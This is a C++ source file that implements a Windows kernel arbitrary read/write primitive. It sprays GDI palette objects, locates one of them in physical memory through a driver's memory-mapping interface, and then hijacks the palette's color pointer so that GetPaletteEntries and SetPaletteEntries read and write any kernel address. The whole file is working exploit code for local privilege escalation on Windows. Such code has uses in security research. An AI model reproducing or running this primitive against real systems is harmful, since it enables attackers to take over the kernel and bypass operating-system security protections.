#include "KernelPrimitives.h"

#include <iostream>
#include <exception>

constexpr size_t NUMBER_OF_PALETTES = 0x3000;
constexpr size_t PAGE_SIZE = 0x1000;
constexpr size_t ALLOCATION_SIZE = PAGE_SIZE + FIELD_OFFSET(PALETTE64, apalColors);
constexpr PALETTEENTRY PALETTE_IDENTIFIER = { 'P', 'w', 'n', 'd' };

bool operator==(const PALETTEENTRY& First, const PALETTEENTRY& Second) {
	return *reinterpret_cast<const UINT32*>(&First) == *reinterpret_cast<const UINT32*>(&Second);
}

bool operator!=(const PALETTEENTRY& First, const PALETTEENTRY& Second) {
	return !(First == Second);
}

struct LOGPALETTE2 : LOGPALETTE {
	PALETTEENTRY SecondEntry;
};

/*
	Checks if a pointer is pointing at a palette, return its index if it is, otherwise return -1
*/
UINT32 GetPaletteIndexFromPointer(const PBYTE Pointer, DWORD Tid) {
	if (*reinterpret_cast<const PALETTEENTRY*>(Pointer) != PALETTE_IDENTIFIER) return false;
	// assume it's pointing at a palette, let's make some extra checks, to be certain
	const auto* palette = reinterpret_cast<const PALETTE64*>(Pointer - FIELD_OFFSET(PALETTE64, apalColors));
	if (palette->cEntries == 2 && palette->BaseObject.Tid == Tid) {
		return *reinterpret_cast<const UINT32*>(&palette->apalColors[1]);
	} 
	return -1;
}

VOID KernelReadWrite::SprayPalettes(std::vector<HPALETTE>& Palettes) {
	LOGPALETTE2 palette{};
	palette.palVersion = 0x300;
	palette.palNumEntries = 2;
	palette.palPalEntry[0] = PALETTE_IDENTIFIER;

	for (UINT32 i = 0; i < NUMBER_OF_PALETTES; ++i) {
		palette.palPalEntry[1] = *reinterpret_cast<PALETTEENTRY*>(&i);
		Palettes[i] = CreatePalette(&palette);
	}
}

/*
	Finds a palette in-memory and saves a virtual-memory mapping to it, and its handle.
*/
VOID KernelReadWrite::FindMappedPalette(const std::vector<HPALETTE>& Palettes) {
	ULONG_PTR currentPhysicalAddress = 0;
	PBYTE mappedPaged = nullptr;
	auto tid = GetCurrentThreadId();
	while ((mappedPaged =
		reinterpret_cast<PBYTE>(this->driver.MapPhysicalMemory(ALLOCATION_SIZE, currentPhysicalAddress))) != nullptr) {
		auto paletteIndex = 0;

		for (auto i = FIELD_OFFSET(PALETTE64, apalColors); i < ALLOCATION_SIZE - sizeof(PALETTEENTRY); ++i) {
			if ((paletteIndex = GetPaletteIndexFromPointer(mappedPaged + i, tid)) != -1) {
				// found a palette
				this->foundPaletteAddress = reinterpret_cast<PALETTE64*>(mappedPaged + i - FIELD_OFFSET(PALETTE64, apalColors));
				this->foundPaletteHandle = Palettes[paletteIndex];
				std::cout << "Found palette at index " << paletteIndex << std::endl;
				break;
			}
		}
		if (this->foundPaletteAddress)
			break;

		this->driver.UnmapPhysicalMemory(currentPhysicalAddress);
		currentPhysicalAddress += PAGE_SIZE;
	}
}

VOID KernelReadWrite::FreeOtherPalettes(const std::vector<HPALETTE>&& Palettes) {
	for (auto i = 0; i < Palettes.size(); ++i) {
		if (Palettes[i] != this->foundPaletteHandle) {
			DeleteObject(Palettes[i]);
		}
	}
}

KernelReadWrite::KernelReadWrite(const std::string& DriverPath) : driver(DriverPath) {
	std::vector<HPALETTE> palettes;
	// step 1: spray palettes
	this->SprayPalettes(palettes);
	std::cout << "Sprayed palettes\n";
	// step 2: find palette in physical memory and save mapped page
	this->FindMappedPalette(palettes);
	std::cout << "Found mapped palette, handle " << std::hex << \
		this->foundPaletteHandle << " Mapped address " << this->foundPaletteAddress << std::endl;
	// step 3: cleanup the rest
	this->FreeOtherPalettes(std::move(palettes));
	std::cout << "Freed other palettes\n";
}

ULONG64 KernelReadWrite::ReadQword(PVOID Address) {
	this->foundPaletteAddress->pFirstColor = reinterpret_cast<PALETTEENTRY*>(Address);
	UINT32 result[2];
	if (GetPaletteEntries(this->foundPaletteHandle, 0, 2, reinterpret_cast<PALETTEENTRY*>(&result)) != 2) {
		throw std::exception("Failed to read from address");
	}
	std::cout << "Read from address " << std::hex << Address << " got " << result[1] << result[0] << "\n";
	return *reinterpret_cast<ULONG64*>(&result);
}

VOID KernelReadWrite::WriteQword(ULONG64 Value, PVOID Address) {
	this->foundPaletteAddress->pFirstColor = reinterpret_cast<PALETTEENTRY*>(Address);
	ULONG64 localVal = Value;
	if (SetPaletteEntries(this->foundPaletteHandle, 0, 2, reinterpret_cast<const PALETTEENTRY*>(&localVal)) != 2) {
		throw std::exception("Failed to write to address");
	}
	std::cout << "Written to " << std::hex << Address << "value " << Value << std::endl;
}
